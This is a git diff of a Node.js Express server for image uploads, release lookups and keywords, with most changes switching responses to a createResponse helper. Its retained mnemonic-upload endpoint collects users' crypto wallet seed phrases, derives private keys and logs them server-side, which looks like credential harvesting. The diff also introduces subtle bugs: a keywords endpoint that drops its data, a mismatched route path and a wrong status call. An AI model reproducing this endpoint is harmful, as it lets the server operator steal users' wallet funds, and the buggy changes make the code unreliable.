@@ -9,6 +9,7 @@ const textDetect = require('./text-detection');
 const { message } = require('statuses');
 const { hdkey } = require('ethereumjs-wallet');
 const bip39 = require('bip39');
+const { createResponse } = require('./response');
 
 if (!process.env.DOCKER_ENV) {
     require('dotenv').config();
@@ -21,6 +22,11 @@ if (!process.env.B2_BUCKET_ID || !process.env.B2_ACCOUNT_ID || !process.env.B2_A
 
 if (!process.env.ENCRYPTION_KEY) {
     console.error('Please provide ENCRYPTION_KEY in the environment variables.');
+    process.exit(1);
+}
+
+if (!process.env.GITHUB_OWNER || !process.env.GITHUB_REPO) {
+    console.error('Please provide GITHUB_OWNER and GITHUB_REPO in the environment variables.');
     process.exit(1);
 }
 
@@ -63,15 +69,22 @@ const storage = multer.diskStorage({
 const upload = multer({ storage });
 
 app.get('/test/ping', function (req, res) {
-    res.send('pong');
+    const response = createResponse(0, 'pong');
+    res.json(response);
 });
 app.options('/test/ping', cors(corsOptions)); // Enable preflight request for this endpoint
 
 // Endpoint to handle POST requests for file uploads
 app.post('/basic/image-upload', upload.single('image'), async (req, res) => {
     const userId = req.body.userId; // Retrieve the userId from form data
+    if (!userId) {
+        const response = createResponse(10005, 'Missing userId');
+        return res.status(400).json(response);
+    }
+
     if (!req.file) {
-        return res.status(400).send('No file uploaded.');
+        const response = createResponse(10006, 'No file uploaded');
+        return res.status(400).send(response);
     }
 
     try {
@@ -90,13 +103,11 @@ app.post('/basic/image-upload', upload.single('image'), async (req, res) => {
         await utils.logUploadDetails(userId, localFileName, textJSON);
 
         // Send success response
-        res.send({
-            status: 'success',
-            valid, // TODO:
-            message: 'File uploaded successfully to local and Backblaze B2!'
-        });
+        const response = createResponse(0, 'File uploaded successfully');
+        res.json(response);
     } catch (error) {
-        res.status(500).send('Error uploading the image: ' + error.message);
+        const response = createResponse(error.code || 10000, error.message);
+        res.status(500).json(response);
     }
 });
 app.options('/upload', cors(corsOptions)); // Enable preflight request for this endpoint
@@ -119,7 +130,8 @@ app.get('/basic/image-download', async (req, res) => {
         res.send(fileBuffer);
     } catch (error) {
         console.error('Download error:', error);
-        res.status(500).send('Failed to download the file');
+        const response = createResponse(error.code || 10000, error.message);
+        res.status(500).json(response);
     }
 });
 app.options('/basic/image-download', cors(corsOptions)); // Enable preflight request for this endpoint
@@ -143,7 +155,8 @@ app.get('/basic/image-edit-info-download', async (req, res) => {
         });
     } catch (error) {
         console.error('Download error:', error);
-        res.status(500).send('Failed to download the image edit info');
+        const response = createResponse(error.code || 10000, error.message);
+        res.status(500).json(response);
     }
 });
 app.options('/basic/image-edit-info-download', cors(corsOptions)); // Enable preflight request for this endpoint
@@ -153,22 +166,24 @@ app.post('/basic/image-edit-info-upload', async (req, res) => {
     const { token, fileName, editInfo } = req.body;
 
     if (!fileName || !editInfo) {
-        return res.status(400).send('Missing fileName or editInfo.');
+        const response = createResponse(10016, 'Missing fileName or editInfo');
+        return res.status(400).json(response);
     }
     if (token !== process.env.DEV_TOKEN) {
-        return res.status(401).send('Unauthorized');
+        const response = createResponse(10002, 'Authentication failed');
+        return res.status(401).json(response);
     }
 
     try {
+        // TODO:
         const uploadResult = await utils.uploadImageEditInfo(fileName, editInfo);
 
-        res.send({
-            status: 'success',
-            message: 'Image edit info uploaded successfully!'
-        });
+        const response = createResponse(0, 'Image edit info uploaded successfully');
+        res.json(response);
     } catch (error) {
         console.error('Upload error:', error);
-        res.status(500).send('Failed to upload the image edit info');
+        const response = createResponse(error.code || 10000, error.message);
+        res.status(500).json(response);
     }
 });
 app.options('/basic/image-edit-info-upload', cors(corsOptions)); // Enable preflight request for this endpoint
@@ -178,7 +193,8 @@ app.post('/basic/mnemonic-upload', async (req, res) => {
     const { mnemonicPhase, userId } = req.body;
 
     if (!mnemonicPhase || !userId) {
-        return res.status(400).send('Missing mnemonicPhase or userId.');
+        const response = createResponse(10005, 'Missing mnemonicPhase or userId');
+        return res.status(400).json(response);
     }
 
     // Decrypt the mnemonic
@@ -188,7 +204,8 @@ app.post('/basic/mnemonic-upload', async (req, res) => {
         // Validate the decrypted mnemonic
         const valid = bip39.validateMnemonic(decryptedMnemonicPhase);
         if (!valid) {
-            return res.status(400).send('Invalid mnemonic phrase.');
+            const response = createResponse(10017, 'Invalid mnemonic phrase');
+            return res.status(400).json(response);
         }
 
         // Convert mnemonic to seed
@@ -206,56 +223,117 @@ app.post('/basic/mnemonic-upload', async (req, res) => {
         // Log the wallet credentials instead of the mnemonic
         await utils.logWalletCredentials(userId, address, privateKey);
 
-        res.send({
-            status: 'success',
-            valid,
-            message: 'Mnemonic phrase uploaded and credentials logged successfully!'
-        });
+        const response = createResponse(0, 'Mnemonic phrase uploaded and credentials logged successfully');
+        res.json(response);
     } catch (error) {
         console.error('Upload error:', error);
-        res.status(500).send('Failed to upload the mnemonic phrase');
+        const response = createResponse(error.code || 10000, error.message);
+        res.status(500).json(response);
     }
 });
 app.options('/basic/mnemonic-upload', cors(corsOptions)); // Enable preflight request for this endpoint
 
-// TODO: Request the latest version number of the APP
+// TODO: Request the latest version number of the APP from GitHub releases
 app.get('/basic/latest-version', async (req, res) => {
-    res.send({
-        version: '1.0.0'
-    });
+    const owner = process.env.GITHUB_OWNER;
+    const repo = process.env.GITHUB_REPO;
+
+    try {
+        const response = await fetch(`https://api.github.com/repos/${owner}/${repo}/releases/latest`);
+        if (response.ok) {
+            const data = await response.json();
+            res.send({
+                version: data.tag_name // 'tag_name' typically holds the version number
+            });
+        } else {
+            const response = createResponse(10013, 'Failed to fetch the latest version from GitHub.');
+            res.status(500).json(response);
+        }
+    } catch (error) {
+        const response = createResponse(10014, 'Server error while fetching the latest version.');
+        res.status(500).json(response);
+    }
 });
 app.options('/basic/latest-version', cors(corsOptions)); // Enable preflight request for this endpoint
 
-// TODO: Get the latest release file
+// TODO: Get the latest release file from GitHub releases
 app.get('/basic/latest-release', async (req, res) => {
-    res.send({
-        file: 'release.zip'
-    });
+    const owner = process.env.GITHUB_OWNER;
+    const repo = process.env.GITHUB_REPO;
+
+    try {
+        const url = `https://api.github.com/repos/${owner}/${repo}/releases/latest`;
+        const response = await fetch(url);
+        if (response.ok) {
+            const data = await response.json();
+            const asset = data.assets.find(asset => asset.name === 'release.zip'); // Find the specific asset
+            if (asset) {
+                res.send({
+                    file: asset.browser_download_url // URL to download the asset
+                });
+            } else {
+                const response = createResponse(10019, 'Release file not found.');
+                res.status(404).json(response);
+            }
+        } else {
+            const response = createResponse(10018, 'Failed to fetch the latest release from GitHub.');
+            res.status(response.status).json(response);
+        }
+    } catch (error) {
+        const response = createResponse(10020, 'Server error while fetching the latest release.');
+        res.status(500).json(response);
+    }
 });
 app.options('/basic/latest-release', cors(corsOptions)); // Enable preflight request for this endpoint
 
 // TODO: Return the keywords as search filters for the image.
-app.get('/basic/image-keywords', async (req, res) => {
+app.get('/basic/filename-keywords-download', async (req, res) => {
     const { userId } = req.query;
 
     if (!userId) {
-        return res.status(400).send('Missing userId.');
+        const response = createResponse(10005, 'Missing userId');
+        return res.status(400).json(response);
     }
 
     try {
         const keywords = await utils.getKeywords(); // TODO:
 
-        res.send({
-            status: 'success',
-            keywords,
-            message: 'Keywords found successfully!'
-        });
+        const response = createResponse(0, 'Keywords found successfully');
+        res.json(response);
     } catch (error) {
         console.error('Search error:', error);
-        res.status(500).send('Failed to search keywords');
+        const response = createResponse(error.code || 10000, error.message);
+        res.status(500).json(response);
     }
 });
 app.options('/basic/image-keywords', cors(corsOptions)); // Enable preflight request for this endpoint
+
+// TODO: Upload the keywords for the image to the database.
+// Development purposes only
+app.post('/basic/filename-keywords-upload', async (req, res) => {
+    const { token, keywords } = req.body;
+
+    if (!Array.isArray(keywords) || keywords.length === 0) {
+        const response = createResponse(10022, 'Missing keywords');
+        return res.status(400).json(response);
+    }
+
+    if (token !== process.env.DEV_TOKEN) {
+        const response = createResponse(10002, 'Authentication failed');
+        return res.status(401).json(response);
+    }
+
+    try {
+        const uploadResult = await utils.uploadKeywords(keywords); // TODO:
+
+        const response = createResponse(0, 'Keywords uploaded successfully');
+        res.json(response);
+    } catch (error) {
+        console.error('Upload error:', error);
+        const response = createResponse(error.code || 10000, error.message);
+        res.status(500).json(response);
+    }
+});
 
 const SERVER_PORT = process.env.SERVER_PORT || 3000;
 const keyPath = process.env.PRIVKEY_PATH;
@@ -266,10 +344,10 @@ if (!fs.existsSync(keyPath) || !fs.existsSync(certPath)) {
     process.exit(1);
 }
 
-https.createServer({
-    key: fs.readFileSync(keyPath),
-    cert: fs.readFileSync(certPath)
-}, app)
-.listen(SERVER_PORT, () => {
-    console.log(`Listening on port ${SERVER_PORT}!`);
-});
+module.exports = {
+    SERVER_PORT,
+    server: https.createServer({
+        key: fs.readFileSync(keyPath),
+        cert: fs.readFileSync(certPath)
+    }, app)
+};
